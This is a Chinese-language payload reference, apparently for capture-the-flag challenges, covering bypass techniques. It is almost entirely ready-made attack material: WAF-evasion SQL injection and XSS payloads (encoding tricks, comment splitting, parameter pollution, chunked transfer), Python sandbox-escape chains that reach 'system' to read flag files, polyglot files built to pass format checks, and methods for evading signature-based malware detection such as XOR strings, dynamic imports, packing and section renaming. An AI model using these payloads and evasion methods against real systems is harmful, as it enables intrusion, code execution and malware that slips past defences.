# Payload DB — 绕过（WAF 边界 / 沙箱 / 格式校验）

> 这三类题的共同结构：**功能等价但形态不同**。先确认「被拦的是形态还是语义」——
> 换编码/换等价语法通常就够，不必造新漏洞。

## WAF / 边界防护绕过（注入类）
- 先确认拦在哪一层：同一 payload 直连后端 vs 经 WAF 的响应差异（状态码/页长/耗时）。
- 大小写 / 关键字拆分：`UnIoN SeLeCt`、`/**/union/**/select`、`union%0aselect`。
- 注释与空字节：`/*!50000union*/`、`union-- -select`、`%00`。
- 等价函数：`AND SLEEP(3)` → `AND BENCHMARK(5000000,MD5(1))`、`AND (SELECT 1 FROM (SELECT SLEEP(3))a)`。
- 编码绕过：URL 双编码 `%2527`、Unicode `%u0027`、HTML 实体 `&#39;`、宽字节 `%bf%27`。
- 参数污染：`?id=1&id=2`、`?id=1%26id=2`、JSON 里塞重复键。
- 传输层绕过：`Content-Type: application/json` 换 `text/plain`；分块传输 `Transfer-Encoding: chunked`；
  `X-HTTP-Method-Override`；超长参数把 WAF 缓冲撑爆（`?id=1&pad=AAAA...(8k)`）。
- XSS 绕过：`<svg onload=alert(1)>`、`<img src=x onerror=alert(1)>`、`<script>alert` 被拦时
  用 `javascript:`、`<details open ontoggle=>`、属性内 `"onmouseover=`。
- **判据**：绕过成功的标志是后端报错/回显变了，不是 WAF 页变了 —— 盯后端响应。

## Python 沙箱逃逸
- 起手：`print(globals().keys())`、`print(dir(__builtins__))`、`print(().__class__)`。
- 找子类走 os：
  `[c for c in ().__class__.__bases__[0].__subclasses__() if 'wrap_close' in c.__name__]`
  → `().__class__.__bases__[0].__subclasses__()[N].__init__.__globals__['system']('cat /flag*')`
- 直接读文件（无需 os）：
  `open('/flag').read()`、`().__class__.__mro__[1].__subclasses__()` 里找 `_io.FileIO`。
- 内建被删时：`__builtins__` 从 `().__class__.__base__.__subclasses__()[N].__init__.__globals__['__builtins__']` 取回。
- 字符串/字符被过滤：用 `chr()` 拼、`getattr` 拼属性名、`\x5f\x5fimport\x5f\x5f` 编码。
- `import` 被拦：`__import__('os')`、`__builtins__.__dict__['__import__']('os')`、`importlib.import_module`。
- 反弹不可用（无公网）→ 直接读 flag 文件或写文件。

## 格式校验 / 检测规避（构造等价制品）
- **文件类型校验**（本题型）：要求同时满足多种格式语义 → 用「多格式容器」：
  - ZIP + 图片：`cat a.png b.zip > poly.png`（PNG 尾附 ZIP，两种解析器都认）。
  - GIF/JPEG 头 + 脚本体：`printf 'GIF89a' > x; cat payload >> x`。
  - PDF + JS：PDF 里嵌 `/JS`，同时文件头是 `%PDF`。
  - 用 `file` 与 `xxd | head` 自证「两个解析器分别看到什么」。
- **特征检测规避**（本题型：功能等价但躲过基于特征的检测）：
  - 先搞清检测特征：字符串？导入表？节区名？熵？——`strings`/`objdump -p`/`readelf -S` 逐个对照。
  - 字符串特征 → 拆分/异或/运行时拼接（`"fl"+"ag"`、`xor` 解码器）。
  - 导入表特征 → 动态解析（`GetProcAddress`/`dlsym`）代替静态导入。
  - 节区/签名特征 → 换编译器/加壳/改节名（`objcopy --rename-section`）。
  - 行为特征 → 换等价 API（`system`→`execve`→`posix_spawn`）。
  - **判据**：本地有检测器就用它跑一遍，直到「功能仍等价 + 检测不再命中」。
- **通用纪律**：先跑一次基线，记录检测器**具体**报了什么特征，再针对性改那一处。
  不要盲改一堆东西 —— 会把「能过的部分」也改坏。
